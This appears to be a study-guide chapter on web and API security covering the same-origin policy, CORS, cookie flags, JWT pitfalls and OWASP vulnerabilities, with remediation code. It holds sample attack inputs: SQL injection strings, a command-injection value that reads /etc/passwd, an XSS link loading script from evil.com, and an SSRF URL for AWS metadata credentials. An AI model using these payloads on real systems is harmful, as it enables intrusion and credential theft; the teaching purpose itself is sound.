# 7. Web Application & API Security

## 7.1 Web Architecture & Browser Security Model

### 7.1.1 The Same-Origin Policy (SOP)
The foundational security mechanism implemented by modern web browsers to isolate potentially malicious documents and scripts loaded from different origins.

* **Definition of an Origin:** An origin is strictly defined by the combination of three components:
  $$\text{Origin} = \text{Scheme (Protocol)} + \text{Host (Domain)} + \text{Port}$$

| Comparison Target | Same Origin as `https://example.com:443/app/login`? | Reason |
|---|---|---|
| `https://example.com/app/dashboard` | **YES** | Scheme (`https`), Host (`example.com`), and default port (`443`) match |
| `http://example.com/app/login` | **NO** | Scheme mismatch (`http` vs `https`) |
| `https://api.example.com/login` | **NO** | Host mismatch (subdomain differs) |
| `https://example.com:8080/login` | **NO** | Port mismatch (`8080` vs `443`) |

* **What SOP Restricts:** Scripts executing on Origin A cannot read the DOM, cookies, `localStorage`, or read response bodies of AJAX/Fetch requests sent to Origin B.
* **What SOP Allows:** Embedding cross-origin resources: images (`<img>`), stylesheets (`<link>`), scripts (`<script src="...">`), and form submissions (`<form action="...">`).

### 7.1.2 Cross-Origin Resource Sharing (CORS)
A standardized HTTP header mechanism allowing servers to declare which external origins are permitted to access their restricted resources, creating controlled exceptions to SOP.

```
Browser                                               Server (api.bank.com)
   │                                                             │
   ├────── Pre-flight Request: OPTIONS /transfer ───────────────►│
   │       Origin: https://app.partner.com                       │
   │       Access-Control-Request-Method: POST                   │
   │                                                             │
   │◄───── Pre-flight Response: 200 OK ──────────────────────────┤
   │       Access-Control-Allow-Origin: https://app.partner.com  │
   │       Access-Control-Allow-Methods: POST, GET               │
   │       Access-Control-Allow-Credentials: true                │
   │                                                             │
   ├────── Actual Request: POST /transfer ──────────────────────►│
   │◄───── Actual Response: 200 OK with Data ────────────────────┤
```

* **Common Dangerous CORS Misconfigurations:**
  1. `Access-Control-Allow-Origin: *` combined with sensitive private API endpoints.
  2. Dynamically reflecting the incoming `Origin` request header back into `Access-Control-Allow-Origin` without validation, combined with `Access-Control-Allow-Credentials: true`. This allows any malicious website to read the victim's authenticated API responses.
  3. Trusting `null` origin (`Access-Control-Allow-Origin: null`), which can be triggered by sandboxed iframes.

---

## 7.2 Session Management & Token Security

### 7.2.1 Cookies vs Web Storage
| Storage Location | Accessible via JavaScript? | Sent Automatically with Requests? | Best Suited For | Security Evaluation |
|---|---|---|---|---|
| **Cookies** | Yes (unless `HttpOnly` flag is set) | **Yes** (sent in `Cookie` header on matching domain/path) | Session Identifiers, Auth Tokens | **Secure** when flags (`HttpOnly`, `Secure`, `SameSite`) are enforced |
| **LocalStorage** | **Yes** (`window.localStorage`) | No (must be manually attached via JS) | Non-sensitive UI preferences (dark mode, language) | **Dangerous for Auth Tokens:** Accessible by any script running on the page (instantly stolen via XSS) |
| **SessionStorage** | **Yes** (`window.sessionStorage`) | No (cleared when browser tab closes) | Temporary form data, single-tab state | Vulnerable to XSS; limited utility across tabs |

### 7.2.2 Critical Cookie Security Flags
1. **`HttpOnly`:** Prevents client-side scripts from reading the cookie via `document.cookie`. Completely mitigates credential/session theft via Cross-Site Scripting (XSS).
2. **`Secure`:** Enforces that the browser transmits the cookie exclusively over encrypted **HTTPS** connections, protecting against plaintext sniffing on untrusted Wi-Fi.
3. **`SameSite`:** Controls whether cookies are sent along with cross-site requests (the primary defense against CSRF):
   * **`Strict`:** Cookie is sent *only* if the request originates from the same site. Never sent on third-party links or cross-site requests.
   * **`Lax` (Modern Browser Default):** Cookie is withheld on cross-site subrequests (images, iframes), but sent when a user follows a standard top-level navigation link (`<a href="...">`).
   * **`None`:** Cookie sent on all cross-site requests (requires `Secure` flag to be set simultaneously).

### 7.2.3 JSON Web Tokens (JWT) Deep Dive
A compact, URL-safe means of representing claims securely between two parties. Commonly used in stateless authentication architectures.

```
       Header                    Payload                   Signature
[ eyJhbGciOiJIUzI1... ] . [ eyJzdWIiOiIxMjM0NT... ] . [ 4a8b7c9d1e2f... ]
  Base64URL encoded         Base64URL encoded         Cryptographic hash/signature
  (Algorithm & Token Type)  (Claims: User ID, Roles)  (Verifies token hasn't changed)
```

* **How Signature Verification Works:**
  $$\text{Signature} = \text{HMAC-SHA256}(\text{Header} + "." + \text{Payload}, \text{SecretKey})$$
  The receiving server re-computes this signature using its private secret. If a malicious client modifies their user ID or role in the payload, the re-computed signature will not match, and the request is rejected.
* **Critical JWT Security Pitfalls:**
  * **The `alg: none` Exploit:** Flawed JWT libraries accept tokens where `alg` is set to `none`, skipping signature verification entirely and accepting forged administrative claims.
  * **Algorithm Confusion Attack:** Switching an asymmetric algorithm (RS256) to symmetric (HS256) and signing the token using the server's public key (which is publicly visible) as the HMAC secret.
  * **Weak Secret Keys:** If the HMAC secret is a short, predictable string, attackers can brute-force the secret offline using tools like `hashcat` or `jwt-cracker`.
  * **Lack of Immediate Revocation:** Because JWTs are stateless, if an employee is terminated or a token is leaked, the token remains valid until its expiration (`exp`) claim lapses unless an active server-side blocklist/Redis cache is queried.

---

## 7.3 OWASP Top 10 Deep Dive (Technical Mechanics & Code Fixes)

### 7.3.1 A01: Broken Access Control (Ranked #1)
**Vulnerability Mechanism:** Occurs when applications fail to properly enforce restrictions on what authenticated users are allowed to execute or view.

* **Insecure Direct Object Reference (IDOR):**
  * *Vulnerable Request:* `GET /api/documents?doc_id=1045`
  * *Exploit:* An attacker changes the parameter to `doc_id=1046` and views another customer's confidential tax return because the backend verifies only *who* the user is, but fails to check *if that user owns document 1046*.
* **Code-Level Remediation:** Enforce server-side contextual ownership checks on every database transaction:
  ```python
  # SECURE IMPLEMENTATION
  def get_document(doc_id, current_user):
      # Must enforce user ownership in the query predicate
      doc = db.query(Document).filter(Document.id == doc_id, Document.owner_id == current_user.id).first()
      if not doc:
          raise HTTPException(status_code=404, detail="Document not found")
      return doc
  ```

---

### 7.3.2 A03: Injection (SQL Injection & Command Injection)
**Vulnerability Mechanism:** Hostile user input is interpreted as executable commands by an underlying interpreter due to improper separation of code and data.

#### SQL Injection (SQLi)
* **Vulnerable Query Construction:**
  ```python
  # INSECURE: Dynamic String Concatenation
  query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
  ```
* **Attack Payload:**
  Entering username: `admin' --` or `' OR '1'='1`
  The executed query becomes:
  ```sql
  SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
  ```
  The `--` comments out the remainder of the query, bypassing authentication completely.
* **SQLi Types:**
  * **In-Band (Classic):** Results or database errors visible directly in the web page response (Union-based, Error-based).
  * **Inferential (Blind):** No data displayed; attacker reconstructs data character-by-character by asking True/False questions:
    * *Boolean Blind:* Testing if page loads normally or changes output.
    * *Time-Based Blind:* Measuring response delays: `' OR IF(1=1, SLEEP(5), 0) --`
  * **Out-of-Band (OOB):** Triggering external DNS/HTTP lookups from the database server to an attacker-controlled listener.
* **Code-Level Remediation (Parameterized Queries / Prepared Statements):**
  ```python
  # SECURE: Prepared Statements
  # The SQL engine compiles the query structure first. User input is treated strictly as literal data.
  cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
  ```

#### OS Command Injection
* *Vulnerable Code:* `os.system("ping -c 4 " + user_input)`
* *Attack Payload:* `8.8.8.8; cat /etc/passwd`
* *Remediation:* Never pass user input to shell interpreters; use safe parameterized APIs (`subprocess.run(['ping', '-c', '4', ip], shell=False)`).

---

### 7.3.3 Cross-Site Scripting (XSS)
**Vulnerability Mechanism:** Injection of malicious client-side JavaScript into trusted web applications, which executes inside the browser of an unsuspecting victim.

| XSS Variant | Where Payload is Stored | How It Executes | Example Scenario |
|---|---|---|---|
| **Stored (Persistent)** | Permanently stored in the database / server | Injected script is fetched and executed whenever any user views the compromised page | Malicious payload saved in a forum comment or profile bio |
| **Reflected (Non-Persistent)** | In the immediate HTTP request (URL query parameter) | Server reflects the input directly into the HTTP response body without sanitization | Phishing link: `https://site.com/search?q=<script src=evil.com/x.js></script>` |
| **DOM-based** | Exists purely client-side in the browser DOM | Client-side JavaScript reads data from a **Source** (`location.hash`) and writes it insecurely to an execution **Sink** (`document.write()`, `innerHTML`) without server involvement | `document.getElementById('name').innerHTML = location.search;` |

* **Impact:** Hijacking session cookies, keystroke logging (credential theft), injecting fake login forms (phishing), triggering forced actions on behalf of the user.
* **Comprehensive Defense:**
  1. **Context-Aware Output Encoding:** Encode HTML entities (`<` $\rightarrow$ `&lt;`, `>` $\rightarrow$ `&gt;`), JavaScript strings, and URL attributes before rendering user input.
  2. **Content Security Policy (CSP):** HTTP header restricting where scripts can be loaded and executed from (disallowing `unsafe-inline` scripts).
  3. **`HttpOnly` Cookie Flag:** Ensures stolen scripts cannot access sensitive authentication cookies.

---

### 7.3.4 Cross-Site Request Forgery (CSRF)
**Vulnerability Mechanism:** An attacker tricks an authenticated victim’s browser into submitting an unauthorized state-changing HTTP request to a vulnerable application that implicitly trusts the browser's credentials (cookies/basic auth).

```
Victim Browser                          Vulnerable Bank (bank.com)
     │                                               │
     ├──── 1. User logs in; receives auth cookie ───►│
     │                                               │
Victim visits evil.com                               │
     │                                               │
     ├──── 2. evil.com hidden image/form: ───────────►│
     │        POST /transfer?to=attacker&amt=5000     │
     │        [Browser automatically attaches         │
     │         bank.com cookies!]                    │
     │                                               │
     │◄─── 3. Bank executes unauthorized transfer! ──┤
```

* **XSS vs CSRF — Critical Interview Comparison:**
  * In **XSS**, the attacker runs arbitrary code *inside* the victim's session, capable of reading data and stealing tokens.
  * In **CSRF**, the attacker *cannot read* the response data, but abuses the browser’s automatic inclusion of session cookies to perform an unauthorized action on behalf of the victim.
* **Mitigation:**
  1. **Anti-CSRF Synchronizer Tokens:** Cryptographically random, unpredictable tokens generated by the server, embedded in forms, and validated on every state-changing request (POST/PUT/DELETE). Because `evil.com` cannot read the token under SOP, its forged request fails validation.
  2. **`SameSite=Lax` or `SameSite=Strict` Cookie Attributes:** Prevents the browser from sending session cookies on cross-origin requests.

---

### 7.3.5 A10: Server-Side Request Forgery (SSRF)
**Vulnerability Mechanism:** The web application is coerced into making unauthorized network requests to an arbitrary destination supplied by the user, bypassing network firewalls to target internal systems.

* **High-Yield Cloud Attack Scenario (AWS IMDSv1 Exploitation):**
  * An application has an image upload feature from a URL: `POST /fetch-avatar?url=http://example.com/pic.jpg`
  * An attacker supplies the internal cloud metadata IP address:
    `POST /fetch-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role`
  * The backend server queries its local link-local metadata address and returns AWS temporary IAM access keys directly to the attacker!
* **Remediation:**
  * Restrict and strictly allow-list permitted URL protocols (`https` only; block `file://`, `gopher://`, `dict://`).
  * Enforce strict IP allow-listing and block requests targeting private RFC 1918 subnets (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.1`, `169.254.169.254`).
  * In AWS, migrate to **IMDSv2** (requires session-oriented `PUT` headers with token verification, neutralizing basic SSRF payloads).

---

## 7.4 API Security Fundamentals (OWASP API Top 10)

APIs present a unique attack surface because endpoints directly expose underlying data models and business logic.

* **BOLA (Broken Object Level Authorization — API #1):** The API equivalent of IDOR. An attacker alters an object identifier in an API call (`/api/v1/users/45/profile` $\rightarrow$ `/api/v1/users/46/profile`) and the endpoint fails to validate whether the requester owns that object.
* **BFLA (Broken Function Level Authorization):** A regular user changes an HTTP method or endpoint path to access administrative functions (`GET /api/v1/users` $\rightarrow$ `DELETE /api/v1/users/46` or accessing `/api/v1/admin/export`).
* **Mass Assignment:** An API framework automatically binds user-supplied JSON payload fields directly to database model objects. An attacker sends extra unexpected JSON parameters (`"is_admin": true` or `"role": "superadmin"`), elevating their privileges.
* **Lack of Resources & Rate Limiting:** Failure to limit request frequency or response payload sizes allows attackers to brute-force auth endpoints or cause DoS.

---

## 7.5 Rapid-Fire Follow-Up Questions (Web & API Security)

- *Why does the Same-Origin Policy (SOP) not prevent Cross-Site Request Forgery (CSRF)?* (SOP restricts reading cross-origin responses, but does not block sending cross-origin write requests like forms; the browser automatically attaches cookies to outbound requests unless restricted by SameSite).
- *What is the difference between Reflected XSS and DOM-based XSS?* (Reflected XSS travels through the web server and is reflected in the HTTP response; DOM XSS executes entirely on the client side when JavaScript takes data from an untrusted source and writes to an execution sink without server interaction).
- *How do Prepared Statements eliminate SQL Injection at the architectural level?* (Prepared statements force the database to compile and fix the SQL query syntax tree *before* accepting user parameters, ensuring user input is treated strictly as literal string/numerical values rather than executable SQL logic).
- *What is an Insecure Direct Object Reference (IDOR) and how is it remediated?* (IDOR occurs when an application exposes a reference to an internal object in an API or parameter without verifying user authorization; remediated by enforcing strict server-side ownership checks in database query filters).

---

## Quick-Revision Summary

- **SOP:** Origin = Scheme + Host + Port; blocks cross-origin reads; allows cross-origin embeds.
- **CORS:** Server headers (`Access-Control-Allow-Origin`) that explicitly authorize cross-origin sharing.
- **Cookies:** Enforce `HttpOnly` (blocks XSS theft), `Secure` (HTTPS only), `SameSite=Lax/Strict` (blocks CSRF).
- **JWT:** Header.Payload.Signature; watch out for `alg: none`, weak HMAC keys, and lack of revocation blocklists.
- **OWASP A01 (Broken Access Control):** Top vulnerability; includes IDOR; requires server-side ownership checks.
- **OWASP A03 (SQLi):** Code injection into DB; fix via **Parameterized Queries / Prepared Statements**.
- **XSS vs CSRF:** XSS executes arbitrary code inside victim's session; CSRF tricks victim's browser into sending unauthorized requests using authenticated cookies.
- **SSRF:** Coercing server to query internal networks or cloud metadata (`169.254.169.254`); mitigate via IMDSv2 and IP allow-lists.
- **API Security:** BOLA (IDOR in APIs) and Mass Assignment are top API-specific vulnerabilities.
